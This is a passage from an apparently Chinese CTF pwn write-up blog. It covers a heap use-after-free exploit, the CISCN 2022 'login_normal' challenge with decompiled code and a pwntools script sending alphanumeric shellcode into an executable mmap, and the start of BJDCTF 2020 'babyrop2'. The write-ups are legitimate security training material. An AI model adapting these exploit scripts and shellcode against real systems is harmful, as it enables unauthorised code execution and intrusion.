class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node4.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">28267</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    sla(<span class="string">b&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Her name size is :&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&quot;Her name is :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Index :&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(elf.sym[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">b&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="CISCN-2022-初赛-login-normal"><a href="#CISCN-2022-初赛-login-normal" class="headerlink" title="[CISCN 2022 初赛]login_normal"></a>[CISCN 2022 初赛]login_normal</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/pwn/pwn/nssctf/11.11/CISCN_2022_初赛_login_normal/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br></pre></td></tr></table></figure>

<p>防御全开的一个题目</p>
<p>逆向一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_FFD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*a1 || *a1 != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*a1 != <span class="string">&#x27;\r&#x27;</span> || a1[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = a1;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(a1, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )</span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    a1 = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">13</span> )</span><br><span class="line">      *a1++ = <span class="number">0</span>;</span><br><span class="line">    s1 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(s1, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  sa = (<span class="type">char</span> *)(a1 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8((<span class="type">const</span> <span class="type">char</span> *)dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE((<span class="type">const</span> <span class="type">char</span> *)dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD((<span class="type">const</span> <span class="type">char</span> *)dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逆向出格式发现<code>v9 = strlen(nptr) - 1;</code>​所以我们又多一个字符无效字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();</span><br><span class="line">    dest = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">char</span> *)&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现往可执行的mmap里面写入shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">    port = <span class="number">1111</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line"><span class="comment"># clibc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;opt:1\nmsg:ro0tt\n&quot;</span>)</span><br><span class="line">shellcode=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line">payload=<span class="string">b&#x27;opt:2\nmsg:&#x27;</span>+shellcode+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="BJDCTF-2020-babyrop2"><a href="#BJDCTF-2020-babyrop2" class="headerlink" title="[BJDCTF 2020]babyrop2"></a>[BJDCTF 2020]babyrop2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  gift();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以泄露canary的值</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwn @ DESKTOP-D3OTKCS in ~/pwn/nssctf/11.11/BJDCTF_2020_babyrop2 [18:12:38] C:130             │   2         0x40090f main+53</span></span><br><span class="line">$ python3 exp.py                                                                                │   3   0x7fa4fe4fdd90 __libc_start_call_main+128</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 7089                                                    │   4   0x7fa4fe4fde40 __libc_start_main+128</span><br><span class="line">[*] pid: 7089                                                                                   │   5         0x4006c9 _start+41</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/pwn/nssctf/11.11/BJDCTF_2020_babyrop2/pwn&#x27;</span>                                       